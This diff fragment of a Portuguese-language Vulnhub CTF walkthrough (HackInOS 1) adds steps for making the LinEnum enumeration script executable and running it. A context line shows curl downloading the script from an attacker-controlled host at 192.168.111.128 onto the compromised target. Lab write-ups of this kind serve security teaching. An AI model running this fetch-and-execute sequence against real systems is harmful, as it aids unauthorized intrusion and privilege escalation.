@@ -203,5 +203,15 @@ curl http://192.168.111.128/LinEnum.sh -O LinEnum.sh
 
 ![trasnfer](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/trasnfer.png)
 
+Mude as permissões do Linenum para que ele seja executado, usando o `chmod +x LinEnum.sh`
+
+![perm](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/perm.png)
+
+Execute o script: `/bin/bash LinEnum.sh`
+
+![execute](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/execute.png)
+
+
+
 
 [back](../index.md)
